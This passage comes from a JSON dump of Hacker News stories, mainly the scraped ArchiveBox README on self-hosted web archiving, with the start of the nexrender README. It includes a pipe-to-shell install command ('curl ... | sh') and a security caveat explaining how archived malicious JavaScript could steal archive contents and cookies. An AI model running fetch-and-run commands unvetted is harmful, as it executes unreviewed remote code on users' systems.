not sure what to do there.  It might be possible to strip this data for certain sites (news) without any risk of violating the users privacy.",
          "I have spent the last hours reading up on everything-WARC that I could find but I still haven't been able to answer my main question: why only as external crawlers?<p>There does not seem to be a tool to actually capture a warc directly in your own browser session. webrecorder (<a href=\"http://webrecorder.io/\" rel=\"nofollow\">http://webrecorder.io/</a>) is the only example I could find that comes close in terms of user experience but it still requires a third party and different browsing habits<p>- are there browser extensions that can save a warc while you browse?<p>- are there API limitations that require external browser control? something browser extensions can't be used for?<p>- or is it simply a question of use case. And crawlers are more popular (for archiving) than locally recorded browser history (for search/analytics)?<p>edit:<p>I have now found <a href=\"https://github.com/machawk1/warcreate\" rel=\"nofollow\">https://github.com/machawk1/warcreate</a>, related discussions in issues #111 and #112 are quite interesting. Looks like there are some serious limitations for browser extensions. I will look deeper into how webrecorder works and how this could be combined"
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/pirate/ArchiveBox",
        "comments.comment_id": [19349449, 19351703],
        "comments.comment_author": ["burtonator", "aloer"],
        "comments.comment_descendants": [2, 2],
        "comments.comment_time": [
          "2019-03-10T00:25:17Z",
          "2019-03-10T12:43:07Z"
        ],
        "comments.comment_text": [
          "I actually talked to the author of ArchiveBox about 1-2 weeks ago. Nice guy and it's good that he's also friendly with the Internet Archive.<p>ArchiveBox uses WARC as it's backing store:<p><a href=\"https://en.wikipedia.org/wiki/Web_ARChive\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Web_ARChive</a><p>which is nice because it's standardized.<p>We were discussing integrating Polar web archives along with ArchiveBox and maybe having some sort of standard to automatically submit these WARCs to the Internet Archive as part of your normal browsing activity.<p>Polar has a similar web capture feature but it's not WARC<p><a href=\"https://getpolarized.io/\" rel=\"nofollow\">https://getpolarized.io/</a><p>(yet)...<p>WARC is probably the easiest standard for Polar to adopt.  Right now we use HTML encoded in JSON objects.<p>When the user captures a web page we save all resources and store them in a PHZ file which you can keep as your own personal web archive.<p>What I'd like to eventually do is update our extension to auto-capture web pages so you could use Polar's cloud storage feature to basically store every page you've ever visited.<p>It really wouldn't be that much money per year. I did the math and it's about $50 per year to store your entire web history.<p>If I can get Polar over to WARC that would mean that tools like ArchiveBox and Polar could interop but we could do things like automatically send your documents you browse to the Internet Archive.<p>There's one huge problem though. What do we do about cookies and private data.  I'm really not sure what to do there.  It might be possible to strip this data for certain sites (news) without any risk of violating the users privacy.",
          "I have spent the last hours reading up on everything-WARC that I could find but I still haven't been able to answer my main question: why only as external crawlers?<p>There does not seem to be a tool to actually capture a warc directly in your own browser session. webrecorder (<a href=\"http://webrecorder.io/\" rel=\"nofollow\">http://webrecorder.io/</a>) is the only example I could find that comes close in terms of user experience but it still requires a third party and different browsing habits<p>- are there browser extensions that can save a warc while you browse?<p>- are there API limitations that require external browser control? something browser extensions can't be used for?<p>- or is it simply a question of use case. And crawlers are more popular (for archiving) than locally recorded browser history (for search/analytics)?<p>edit:<p>I have now found <a href=\"https://github.com/machawk1/warcreate\" rel=\"nofollow\">https://github.com/machawk1/warcreate</a>, related discussions in issues #111 and #112 are quite interesting. Looks like there are some serious limitations for browser extensions. I will look deeper into how webrecorder works and how this could be combined"
        ],
        "id": "d66961a0-ce6b-4f5e-86d2-efebd41ab903",
        "url_text": "ArchiveBox is a powerful, self-hosted internet archiving solution to collect, save, and view sites you want to preserve offline. You can set it up as a command-line tool, web app, and desktop app (alpha), on Linux, macOS, and Windows. You can feed it URLs one at a time, or schedule regular imports from browser bookmarks or history, feeds like RSS, bookmark services like Pocket/Pinboard, and more. See input formats for a full list. It saves snapshots of the URLs you feed it in several formats: HTML, PDF, PNG screenshots, WARC, and more out-of-the-box, with a wide variety of content extracted and preserved automatically (article text, audio/video, git repos, etc.). See output formats for a full list. The goal is to sleep soundly knowing the part of the internet you care about will be automatically preserved in durable, easily accessible formats for decades after it goes down. Demo | Screenshots | Usage . . . . . . . . . . . . . . . . . . . . . . . . . . . . Get ArchiveBox with Docker / apt / brew / pip3 / etc. (see Quickstart below). # Follow the instructions for your package manager in the quickstart, e.g.: pip3 install archivebox # Or use the optional auto setup script to install it for you: curl -sSL 'https://get.archivebox.io' | sh Example usage: adding links to archive. archivebox add 'https://example.com' # add URLs one at a time via args / piped stdin archivebox schedule --every=day --depth=1 https://example.com/rss.xml # or have it import URLs regularly on a schedule Example usage: viewing the archived content. archivebox server 0.0.0.0:8000 # use the interactive web UI archivebox list 'https://example.com' # use the CLI commands (--help for more) ls ./archive/*/index.json # or browse directly via the filesystem Key Features Free & open source, doesn't require signing up for anything, stores all data locally Powerful, intuitive command line interface with modular optional dependencies Comprehensive documentation, active development, and rich community Extracts a wide variety of content out-of-the-box: media (youtube-dl), articles (readability), code (git), etc. Supports scheduled/realtime importing from many types of sources Uses standard, durable, long-term formats like HTML, JSON, PDF, PNG, and WARC Usable as a oneshot CLI, self-hosted web UI, Python API (BETA), REST API (ALPHA), or desktop app (ALPHA) Saves all pages to archive.org as well by default for redundancy (can be disabled for local-only mode) Planned: support for archiving content requiring a login/paywall/cookies (working, but ill-advised until some pending fixes are released) Planned: support for running JS during archiving to adblock, autoscroll, modal-hide, thread-expand... Quickstart Supported OSs: Linux/BSD, macOS, Windows (Docker/WSL) CPUs: amd64, x86, arm8, arm7 (raspi>=3) Easy Setup docker-compose (macOS/Linux/Windows) recommended (click to expand) Docker Compose is recommended for the easiest install/update UX + best security + all the extras working out-of-the-box. Install Docker and Docker Compose on your system (if not already installed). Download the docker-compose.yml file into a new empty directory (can be anywhere). mkdir ~/archivebox && cd ~/archivebox curl -O 'https://raw.githubusercontent.com/ArchiveBox/ArchiveBox/master/docker-compose.yml' Run the initial setup and create an admin user. docker-compose run archivebox init --setup Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. docker-compose up # completely optional, CLI can always be used without running a server # docker-compose run [-T] archivebox [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. docker (macOS/Linux/Windows) Install Docker on your system (if not already installed). Create a new empty directory and initalize your collection (can be anywhere). mkdir ~/archivebox && cd ~/archivebox docker run -v $PWD:/data -it archivebox/archivebox init --setup Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. docker run -v $PWD:/data -p 8000:8000 archivebox/archivebox # completely optional, CLI can always be used without running a server # docker run -v $PWD:/data -it [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. bash auto-setup script (macOS/Linux) Install Docker on your system (optional, highly recommended but not required). Run the automatic setup script. curl -sSL 'https://get.archivebox.io' | sh See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. See setup.sh for the source code of the auto-install script. Manual Setup apt (Ubuntu/Debian) Add the ArchiveBox repository to your sources. # On Ubuntu == 20.04, add the sources automatically: sudo apt install software-properties-common sudo add-apt-repository -u ppa:archivebox/archivebox # On Ubuntu >= 20.10 or <= 19.10, or other Debian-style systems, add the sources manually: echo \"deb http://ppa.launchpad.net/archivebox/archivebox/ubuntu focal main\" | sudo tee /etc/apt/sources.list.d/archivebox.list sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C258F79DCC02E369 sudo apt update Install the ArchiveBox package using apt. sudo apt install archivebox sudo python3 -m pip install --upgrade --ignore-installed archivebox # pip needed because apt only provides a broken older version of Django Create a new empty directory and initalize your collection (can be anywhere). mkdir ~/archivebox && cd ~/archivebox archivebox init --setup # if any problems, install with pip instead Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. archivebox server 0.0.0.0:8000 # completely optional, CLI can always be used without running a server # archivebox [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. See the debian-archivebox repo for more details about this distribution. brew (macOS) Install Homebrew on your system (if not already installed). Install the ArchiveBox package using brew. brew tap archivebox/archivebox brew install archivebox Create a new empty directory and initalize your collection (can be anywhere). mkdir ~/archivebox && cd ~/archivebox archivebox init --setup # if any problems, install with pip instead Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. archivebox server 0.0.0.0:8000 # completely optional, CLI can always be used without running a server # archivebox [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. See the homebrew-archivebox repo for more details about this distribution. pip (macOS/Linux/Windows) Install Python >= v3.7 and Node >= v14 on your system (if not already installed). Install the ArchiveBox package using pip3. Create a new empty directory and initalize your collection (can be anywhere). mkdir ~/archivebox && cd ~/archivebox archivebox init --setup # install any missing extras like wget/git/ripgrep/etc. manually as needed Optional: Start the server then login to the Web UI http://127.0.0.1:8000 Admin. archivebox server 0.0.0.0:8000 # completely optional, CLI can always be used without running a server # archivebox [subcommand] [--args] See below for more usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. See the pip-archivebox repo for more details about this distribution. pacman / pkg / nix (Arch/FreeBSD/NixOS/more) Arch: pacman install archivebox (contributed by @imlonghao) FreeBSD: curl -sSL 'https://get.archivebox.io' | sh (uses pkg + pip3 under-the-hood) Nix: nix-env --install archivebox (contributed by @siraben) More: contribute another distribution...! See below for usage examples using the CLI, Web UI, or filesystem/SQL/Python to manage your archive. Other Options docker + electron Desktop App (macOS/Linux/Windows) Install Docker on your system (if not already installed). Download a binary release for your OS or build the native app from source macOS: ArchiveBox.app.zip Linux: ArchiveBox.deb (alpha: build manually) Windows: ArchiveBox.exe (beta: build manually) Alpha (contributors wanted!): for more info, see the: Electron ArchiveBox repo. Paid hosting solutions (cloud VPS) For more discussion on managed and paid hosting options see here: Issue #531. Next Steps Import URLs from some of the supported Input Formats or view the supported Output Formats... Tweak your UI or archiving behavior Configuration or read about some of the Caveats and troubleshooting steps... Read about the Dependencies used for archiving or the Archive Layout on disk... Or check out our full Documentation or Community Wiki... Usage CLI Usage # archivebox [subcommand] [--args] # docker-compose run archivebox [subcommand] [--args] # docker run -v $PWD:/data -it [subcommand] [--args] archivebox init --setup # safe to run init multiple times (also how you update versions) archivebox --version archivebox help archivebox setup/init/config/status/manage to administer your collection archivebox add/schedule/remove/update/list/shell/oneshot to manage Snapshots in the archive archivebox schedule to pull in fresh URLs in regularly from boorkmarks/history/Pocket/Pinboard/RSS/etc. Web UI Usage archivebox manage createsuperuser # set an admin password archivebox server 0.0.0.0:8000 # open http://127.0.0.1:8000 to view it # you can also configure whether or not login is required for most features archivebox config --set PUBLIC_INDEX=False archivebox config --set PUBLIC_SNAPSHOTS=False archivebox config --set PUBLIC_ADD_VIEW=False SQL/Python/Filesystem Usage sqlite3 ./index.sqlite3 # run SQL queries on your index archivebox shell # explore the Python API in a REPL ls ./archive/*/index.html # or inspect snapshots on the filesystem Overview Input Formats ArchiveBox supports many input formats for URLs, including Pocket & Pinboard exports, Browser bookmarks, Browser history, plain text, HTML, markdown, and more! Click these links for instructions on how to prepare your links from these sources: TXT, RSS, XML, JSON, CSV, SQL, HTML, Markdown, or any other text-based format... Browser history or browser bookmarks (see instructions for: Chrome, Firefox, Safari, IE, Opera, and more...) Pocket, Pinboard, Instapaper, Shaarli, Delicious, Reddit Saved, Wallabag, Unmark.it, OneTab, and more... # archivebox add --help archivebox add 'https://example.com/some/page' archivebox add < ~/Downloads/firefox_bookmarks_export.html archivebox add --depth=1 'https://news.ycombinator.com#2020-12-12' echo 'http://example.com' | archivebox add echo 'any_text_with [urls](https://example.com) in it' | archivebox add # if using docker add -i when piping stdin: # echo 'https://example.com' | docker run -v $PWD:/data -i archivebox/archivebox add # if using docker-compose add -T when piping stdin / stdout: # echo 'https://example.com' | docker-compose run -T archivebox add See the Usage: CLI page for documentation and examples. It also includes a built-in scheduled import feature with archivebox schedule and browser bookmarklet, so you can pull in URLs from RSS feeds, websites, or the filesystem regularly/on-demand. Output Formats Inside each Snapshot folder, ArchiveBox save these different types of extractor outputs as plain files: ./archive/<timestamp>/* Index: index.html & index.json HTML and JSON index files containing metadata and details Title, Favicon, Headers Response headers, site favicon, and parsed site title SingleFile: singlefile.html HTML snapshot rendered with headless Chrome using SingleFile Wget Clone: example.com/page-name.html wget clone of the site with warc/<timestamp>.gz Chrome Headless PDF: output.pdf Printed PDF of site using headless chrome Screenshot: screenshot.png 1440x900 screenshot of site using headless chrome DOM Dump: output.html DOM Dump of the HTML after rendering using headless chrome Article Text: article.html/json Article text extraction using Readability & Mercury Archive.org Permalink: archive.org.txt A link to the saved site on archive.org Audio & Video: media/ all audio/video files + playlists, including subtitles & metadata with youtube-dl Source Code: git/ clone of any repository found on GitHub, Bitbucket, or GitLab links More coming soon! See the Roadmap... It does everything out-of-the-box by default, but you can disable or tweak individual archive methods via environment variables / config. Configuration ArchiveBox can be configured via environment variables, by using the archivebox config CLI, or by editing the ArchiveBox.conf config file directly. archivebox config # view the entire config archivebox config --get CHROME_BINARY # view a specific value archivebox config --set CHROME_BINARY=chromium # persist a config using CLI # OR echo CHROME_BINARY=chromium >> ArchiveBox.conf # persist a config using file # OR env CHROME_BINARY=chromium archivebox ... # run with a one-off config These methods also work the same way when run inside Docker, see the Docker Configuration wiki page for details. The config loading logic with all the options defined is here: archivebox/config.py. Most options are also documented on the Configuration Wiki page. Most Common Options to Tweak # e.g. archivebox config --set TIMEOUT=120 TIMEOUT=120 # default: 60 add more seconds on slower networks CHECK_SSL_VALIDITY=True # default: False True = allow saving URLs w/ bad SSL SAVE_ARCHIVE_DOT_ORG=False # default: True False = disable Archive.org saving MAX_MEDIA_SIZE=1500m # default: 750m raise/lower youtubedl output size PUBLIC_INDEX=True # default: True whether anon users can view index PUBLIC_SNAPSHOTS=True # default: True whether anon users can view pages PUBLIC_ADD_VIEW=False # default: False whether anon users can add new URLs Dependencies For better security, easier updating, and to avoid polluting your host system with extra dependencies, it is strongly recommended to use the official Docker image with everything pre-installed for the best experience. To achieve high fidelity archives in as many situations as possible, ArchiveBox depends on a variety of 3rd-party tools and libraries that specialize in extracting different types of content. These optional dependencies used for archiving sites include: chromium / chrome (for screenshots, PDF, DOM HTML, and headless JS scripts) node & npm (for readability, mercury, and singlefile) wget (for plain HTML, static files, and WARC saving) curl (for fetching headers, favicon, and posting to Archive.org) youtube-dl (for audio, video, and subtitles) git (for cloning git repos) and more as we grow... You don't need to install every dependency to use ArchiveBox. ArchiveBox will automatically disable extractors that rely on dependencies that aren't installed, based on what is configured and available in your $PATH. If not using Docker, make sure to keep the dependencies up-to-date yourself and check that ArchiveBox isn't reporting any incompatibility with the versions you install. # install python3 and archivebox with your system package manager # apt/brew/pip/etc install ... (see Quickstart instructions above) archivebox setup # auto install all the extractors and extras archivebox --version # see info and check validity of installed dependencies Installing directly on Windows without Docker or WSL/WSL2/Cygwin is not officially supported, but some advanced users have reported getting it working. Archive Layout All of ArchiveBox's state (including the index, snapshot data, and config file) is stored in a single folder called the \"ArchiveBox data folder\". All archivebox CLI commands must be run from inside this folder, and you first create it by running archivebox init. The on-disk layout is optimized to be easy to browse by hand and durable long-term. The main index is a standard index.sqlite3 database in the root of the data folder (it can also be exported as static JSON/HTML), and the archive snapshots are organized by date-added timestamp in the ./archive/ subfolder. ./ index.sqlite3 ArchiveBox.conf archive/ ... 1617687755/ index.html index.json screenshot.png media/some_video.mp4 warc/1617687755.warc.gz git/somerepo.git ... Each snapshot subfolder ./archive/<timestamp>/ includes a static index.json and index.html describing its contents, and the snapshot extractor outputs are plain files within the folder. Static Archive Exporting You can export the main index to browse it statically without needing to run a server. Note about large exports: These exports are not paginated, exporting many URLs or the entire archive at once may be slow. Use the filtering CLI flags on the archivebox list command to export specific Snapshots or ranges. # archivebox list --help archivebox list --html --with-headers > index.html # export to static html table archivebox list --json --with-headers > index.json # export to json blob archivebox list --csv=timestamp,url,title > index.csv # export to csv spreadsheet # (if using docker-compose, add the -T flag when piping) # docker-compose run -T archivebox list --html --filter-type=search snozzberries > index.json The paths in the static exports are relative, make sure to keep them next to your ./archive folder when backing them up or viewing them. Caveats Archiving Private Content If you're importing pages with private content or URLs containing secret tokens you don't want public (e.g Google Docs, paywalled content, unlisted videos, etc.), you may want to disable some of the extractor methods to avoid leaking that content to 3rd party APIs or the public. # don't save private content to ArchiveBox, e.g.: archivebox add 'https://docs.google.com/document/d/12345somePrivateDocument' archivebox add 'https://vimeo.com/somePrivateVideo' # without first disabling saving to Archive.org: archivebox config --set SAVE_ARCHIVE_DOT_ORG=False # disable saving all URLs in Archive.org # restrict the main index, snapshot content, and add form to authenticated in users as needed: archivebox config --set PUBLIC_INDEX=False archivebox config --set PUBLIC_SNAPSHOTS=False archivebox config --set PUBLIC_ADD_VIEW=False # if extra paranoid or anti-Google: archivebox config --set SAVE_FAVICON=False # disable favicon fetching (it calls a Google API passing the URL's domain part only) archivebox config --set CHROME_BINARY=chromium # ensure it's using Chromium instead of Chrome Security Risks of Viewing Archived JS Be aware that malicious archived JS can access the contents of other pages in your archive when viewed. Because the Web UI serves all viewed snapshots from a single domain, they share a request context and typical CSRF/CORS/XSS/CSP protections do not work to prevent cross-site request attacks. See the Security Overview page and Issue #239 for more details. # visiting an archived page with malicious JS: https://127.0.0.1:8000/archive/1602401954/example.com/index.html # example.com/index.js can now make a request to read everything from: https://127.0.0.1:8000/index.html https://127.0.0.1:8000/archive/* # then example.com/index.js can send it off to some evil server The admin UI is also served from the same origin as replayed JS, so malicious pages could also potentially use your ArchiveBox login cookies to perform admin actions (e.g. adding/removing links, running extractors, etc.). We are planning to fix this security shortcoming in a future version by using separate ports/origins to serve the Admin UI and archived content (see Issue #239). Note: Only the wget extractor method executes archived JS when viewing snapshots, all other archive methods produce static output that does not execute JS on viewing. If you are worried about these issues ^ you should disable the wget extractor method using archivebox config --set SAVE_WGET=False. Saving Multiple Snapshots of a Single URL First-class support for saving multiple snapshots of each site over time will be added eventually (along with the ability to view diffs of the changes between runs). For now ArchiveBox is designed to only archive each unique URL with each extractor type once. The workaround to take multiple snapshots of the same URL is to make them slightly different by adding a hash: archivebox add 'https://example.com#2020-10-24' ... archivebox add 'https://example.com#2020-10-25' The button in the Admin UI is a shortcut for this hash-date workaround. Storage Requirements Because ArchiveBox is designed to ingest a firehose of browser history and bookmark feeds to a local disk, it can be much more disk-space intensive than a centralized service like the Internet Archive or Archive.today. ArchiveBox can use anywhere from ~1gb per 1000 articles, to ~50gb per 1000 articles, mostly dependent on whether you're saving audio & video using SAVE_MEDIA=True and whether you lower MEDIA_MAX_SIZE=750mb. Disk usage can be reduced by using a compressed/deduplicated filesystem like ZFS/BTRFS, or by turning off extractors methods you don't need. Don't store large collections on older filesystems like EXT3/FAT as they may not be able to handle more than 50k directory entries in the archive/ folder. Try to keep the index.sqlite3 file on local drive (not a network mount) or SSD for maximum performance, however the archive/ folder can be on a network mount or spinning HDD. Screenshots Background & Motivation The aim of ArchiveBox is to enable more of the internet to be archived by empowering people to self-host their own archives. The intent is for all the web content you care about to be viewable with common software in 50 - 100 years without needing to run ArchiveBox or other specialized software to replay it. Vast treasure troves of knowledge are lost every day on the internet to link rot. As a society, we have an imperative to preserve some important parts of that treasure, just like we preserve our books, paintings, and music in physical libraries long after the originals go out of print or fade into obscurity. Whether it's to resist censorship by saving articles before they get taken down or edited, or just to save a collection of early 2010's flash games you love to play, having the tools to archive internet content enables to you save the stuff you care most about before it disappears. The balance between the permanence and ephemeral nature of content on the internet is part of what makes it beautiful. I don't think everything should be preserved in an automated fashion--making all content permanent and never removable, but I do think people should be able to decide for themselves and effectively archive specific content that they care about. Because modern websites are complicated and often rely on dynamic content, ArchiveBox archives the sites in several different formats beyond what public archiving services like Archive.org/Archive.is save. Using multiple methods and the market-dominant browser to execute JS ensures we can save even the most complex, finicky websites in at least a few high-quality, long-term data formats. Comparison to Other Projects Check out our community page for an index of web archiving initiatives and projects. A variety of open and closed-source archiving projects exist, but few provide a nice UI and CLI to manage a large, high-fidelity archive collection over time. ArchiveBox tries to be a robust, set-and-forget archiving solution suitable for archiving RSS feeds, bookmarks, or your entire browsing history (beware, it may be too big to store), including private/authenticated content that you wouldn't otherwise share with a centralized service (this is not recommended due to JS replay security concerns). Comparison With Centralized Public Archives Not all content is suitable to be archived in a centralized collection, whether because it's private, copyrighted, too large, or too complex. ArchiveBox hopes to fill that gap. By having each user store their own content locally, we can save much larger portions of everyone's browsing history than a shared centralized service would be able to handle. The eventual goal is to work towards federated archiving where users can share portions of their collections with each other. Comparison With Other Self-Hosted Archiving Options ArchiveBox differentiates itself from similar self-hosted projects by providing both a comprehensive CLI interface for managing your archive, a Web UI that can be used either independently or together with the CLI, and a simple on-disk data format that can be used without either. ArchiveBox is neither the highest fidelity, nor the simplest tool available for self-hosted archiving, rather it's a jack-of-all-trades that tries to do most things well by default. It can be as simple or advanced as you want, and is designed to do everything out-of-the-box but be tuned to suit your needs. If you want better fidelity for very complex interactive pages with heavy JS/streams/API requests, check out ArchiveWeb.page and ReplayWeb.page. If you want more bookmark categorization and note-taking features, check out Archivy, Memex, Polar, or LinkAce. If you need more advanced recursive spider/crawling ability beyond --depth=1, check out Browsertrix, Photon, or Scrapy and pipe the outputted URLs into ArchiveBox. For more alternatives, see our list here... Internet Archiving Ecosystem Whether you want to learn which organizations are the big players in the web archiving space, want to find a specific open-source tool for your web archiving need, or just want to see where archivists hang out online, our Community Wiki page serves as an index of the broader web archiving community. Check it out to learn about some of the coolest web archiving projects and communities on the web! Community Wiki The Master Lists Community-maintained indexes of archiving tools and institutions. Web Archiving Software Open source tools and projects in the internet archiving space. Reading List Articles, posts, and blogs relevant to ArchiveBox and web archiving in general. Communities A collection of the most active internet archiving communities and initiatives. Check out the ArchiveBox Roadmap and Changelog Learn why archiving the internet is important by reading the \"On the Importance of Web Archiving\" blog post. Reach out to me for questions and comments via @ArchiveBoxApp or @theSquashSH on Twitter Need help building a custom archiving solution? Hire the team that helps build Archivebox to work on your project. (@MonadicalSAS) (They also do general software consulting across many industries) Documentation We use the GitHub wiki system and Read the Docs (WIP) for documentation. You can also access the docs locally by looking in the ArchiveBox/docs/ folder. Getting Started Quickstart Install Docker Reference Usage Configuration Supported Sources Supported Outputs Scheduled Archiving Publishing Your Archive Chromium Install Security Overview Troubleshooting Python API (alpha) REST API (alpha) More Info Tickets Roadmap Changelog Donations Background & Motivation Web Archiving Community ArchiveBox Development All contributions to ArchiveBox are welcomed! Check our issues and Roadmap for things to work on, and please open an issue to discuss your proposed implementation before working on things! Otherwise we may have to close your PR if it doesn't align with our roadmap. Low hanging fruit / easy first tickets: Setup the dev environment Click to expand... 1. Clone the main code repo (making sure to pull the submodules as well) git clone --recurse-submodules https://github.com/ArchiveBox/ArchiveBox cd ArchiveBox git checkout dev # or the branch you want to test git submodule update --init --recursive git pull --recurse-submodules 2. Option A: Install the Python, JS, and system dependencies directly on your machine # Install ArchiveBox + python dependencies python3 -m venv .venv && source .venv/bin/activate && pip install -e '.[dev]' # or: pipenv install --dev && pipenv shell # Install node dependencies npm install # or archivebox setup # Check to see if anything is missing archivebox --version # install any missing dependencies manually, or use the helper script: ./bin/setup.sh 2. Option B: Build the docker container and use that for development instead # Optional: develop via docker by mounting the code dir into the container # if you edit e.g. ./archivebox/core/models.py on the docker host, runserver # inside the container will reload and pick up your changes docker build . -t archivebox docker run -it \\ -v $PWD/data:/data \\ archivebox init --setup docker run -it -p 8000:8000 \\ -v $PWD/data:/data \\ -v $PWD/archivebox:/app/archivebox \\ archivebox server 0.0.0.0:8000 --debug --reload # (remove the --reload flag and add the --nothreading flag when profiling with the django debug toolbar) Common development tasks See the ./bin/ folder and read the source of the bash scripts within. You can also run all these in Docker. For more examples see the GitHub Actions CI/CD tests that are run: .github/workflows/*.yaml. Run in DEBUG mode Click to expand... archivebox config --set DEBUG=True # or archivebox server --debug ... Install and run a specific GitHub branch Click to expand... # docker: docker build -t archivebox:dev https://github.com/ArchiveBox/ArchiveBox.git#dev docker run -it -v $PWD:/data archivebox:dev init --setup # bare metal: pip install 'git+https://github.com/pirate/ArchiveBox@dev' npm install 'git+https://github.com/ArchiveBox/ArchiveBox.git#dev' archivebox init --setup Run the linters Click to expand... (uses flake8 and mypy) Run the integration tests Click to expand... (uses pytest -s) Make migrations or enter a django shell Click to expand... Make sure to run this whenever you change things in models.py. cd archivebox/ ./manage.py makemigrations cd path/to/test/data/ archivebox shell archivebox manage dbshell (uses pytest -s) Contributing a new extractor Click to expand...ArchiveBox extractors are external binaries or Python/Node scripts that ArchiveBox runs to archive content on a page. Extractors take the URL of a page to archive, write their output to the filesystem archive/<timestamp>/<extractorname>/..., and return an ArchiveResult entry which is saved to the database (visible on the Log page in the UI). Check out how we added archivebox/extractors/singlefile.py as an example of the process: Issue #399 + PR #403. The process to contribute a new extractor is like this: Open an issue with your propsoed implementation (please link to the pages of any new external dependencies you plan on using) Ensure any dependencies needed are easily installable via a package managers like apt, brew, pip3, npm (Ideally, prefer to use external programs available via pip3 or npm, however we do support using any binary installable via package manager that exposes a CLI/Python API and writes output to stdout or the filesystem.) Create a new file in archivebox/extractors/<extractorname>.py (copy an existing extractor like singlefile.py as a template) Add config settings to enable/disable any new dependencies and the extractor as a whole, e.g. USE_DEPENDENCYNAME, SAVE_EXTRACTORNAME, EXTRACTORNAME_SOMEOTHEROPTION in archivebox/config.py Add a preview section to archivebox/templates/core/snapshot.html to view the output, and a column to archivebox/templates/core/index_row.html with an icon for your extractor Add an integration test for your extractor in tests/test_extractors.py Submit your PR for review! Once merged, please document it in these places and anywhere else you see info about other extractors: https://github.com/ArchiveBox/ArchiveBox#output-formats https://github.com/ArchiveBox/ArchiveBox/wiki/Configuration#archive-method-toggles https://github.com/ArchiveBox/ArchiveBox/wiki/Install#dependencies Build the docs, pip package, and docker image Click to expand... (Normally CI takes care of this, but these scripts can be run to do it manually) ./bin/build.sh # or individually: ./bin/build_docs.sh ./bin/build_pip.sh ./bin/build_deb.sh ./bin/build_brew.sh ./bin/build_docker.sh Roll a release Click to expand... (Normally CI takes care of this, but these scripts can be run to do it manually) ./bin/release.sh # or individually: ./bin/release_docs.sh ./bin/release_pip.sh ./bin/release_deb.sh ./bin/release_brew.sh ./bin/release_docker.sh Further Reading Home: ArchiveBox.io Demo: Demo.ArchiveBox.io Docs: Docs.ArchiveBox.io Releases: Github.com/ArchiveBox/ArchiveBox/releases Wiki: Github.com/ArchiveBox/ArchiveBox/wiki Issues: Github.com/ArchiveBox/ArchiveBox/issues Forum: Github.com/ArchiveBox/ArchiveBox/discussions Donations: Github.com/ArchiveBox/ArchiveBox/wiki/Donations ",
        "_version_": 1718527393396686848
      },
      {
        "story_id": [21238887],
        "story_author": ["inlife"],
        "story_descendants": [8],
        "story_score": [46],
        "story_time": ["2019-10-13T07:07:08Z"],
        "story_title": "Show HN: Nexrender – Data-Driven Render Automation for After Effects",
        "search": [
          "Show HN: Nexrender – Data-Driven Render Automation for After Effects",
          "https://github.com/inlife/nexrender",
          "Automate your Adobe After Effects rendering workflows. Create data-driven and template based videos. Built with love using nodejs Brought to you by @inlife and other contributors Table of contents Introduction Features How it works Alternatives Installation Usage Job Assets Actions Details Job States Programmatic Information Template rendering Footage items Fields Example Original source Example Static assets Example: Data Assets Fields Example Script Asset Fields Dynamic Parameters Supported Parameter Types Parameter Types examples String Number Array Object Null Functions Warnings Self-Invoking Functions Example Named Functions Anonymous Functions Complete functions example Examples No dynamic parameters. Dynamic variable - Array type parameter Default Dynamic Variable Keyword Parameter Example JSX Script with defaults: Example JSX Script without defaults: Network rendering Using binaries nexrender-server Description: Supported platforms: Requirements: Example nexrender-worker Description: Supported platforms: Requirements: Example Using API Tested with Additional Information Protocols Examples WSL (Windows Subsystem for Linux) Linux Mapping Windows Pathing Binary Workpath Memory Problems Development Project Values Awesome External Packages Awesome Related Projects Custom Actions Migrating from v0.x Naming Structure Assets Rendering CLI Customers Plans Contributors Code Contributors Financial Contributors Individuals Organizations Introduction nexrender is a simple, small, carefully designed application with the main goal of rendering automation for Adobe After Effects based rendering workflows. At this point in time, the project is mainly targeted at people at least somewhat comfortable with scripting or development, and that have basic knowledge of javascript language and json formats. Features data-driven, dynamic, personalized video rendering automated video management, processing, and delivery network oriented project structure, render farm highly modular nature, extensive plugin support works only in cli mode, never launches After Effects GUI application does not require licenses for Adobe After Effects on any worker machine free to use and open source How it works rendering: It uses Adobe After Effects' aerender command-line interface application. compositing: It creates a temporary folder, copies project and replaces assets with provided ones. personalization: It uses AE's expressions, scripting, and compositing (noted above). scheduling: It stores projects in a local database, managed from anywhere using http api. network: It renders project per machine, and can be used to render several projects simultaneously. farm: Can be used to render a single project on several machines via Multi-Machine Sequence. Alternatives Probably the closest (feature-wise) alternative that exists at the moment is the Dataclay's Templater bot edition. Compared to nexrender it has a rich GUI support and a number of enterprise-scale features, however, it is not free. Installation You can download binaries directly from the releases section, or install them using npm, whichever option works better for you. However, please note: the npm version of the binaries doesn't include all optional plugin packages that are covered in the usage section. If you wish to install them as well, please do so by providing each one individually: npm i -g @nexrender/cli @nexrender/action-copy @nexrender/action-encode ... Usage We will be using nexrender-cli binary for this example. It's recommended to download/install it if you haven't already. Also, check out these example/tutorial videos made by our community: \"Creating automated music video with nexrender\" by douglas prod. If using WSL check out wsl support Job A job is a single working unit in the nexrender ecosystem. It is a json document, that describes what should be done, and how it should be done. Minimal job description always should contain a pointer onto Adobe After Effects project, which is needed to be rendered, and a composition that will be used to render. The pointer is src (string) field containing a URI pointing towards specified file, followed by composition (string) field, containing the name of the composition that needs to be rendered. Note: check out supported protocols for src field. // myjob.json { \"template\": { \"src\": \"file:///users/myuser/documents/myproject.aep\", \"composition\": \"main\" } } or for remote file accessible via http // myjob.json { \"template\": { \"src\": \"http://example.com/myproject.aep\", \"composition\": \"main\" } } Submitting this data to the binary will result in start of the rendering process: $ nexrender-cli '{\"template\":{\"src\":\"file:///home/documents/myproject.aep\",\"composition\":\"main\"}}' Note: on MacOS you might need to change the permissions for 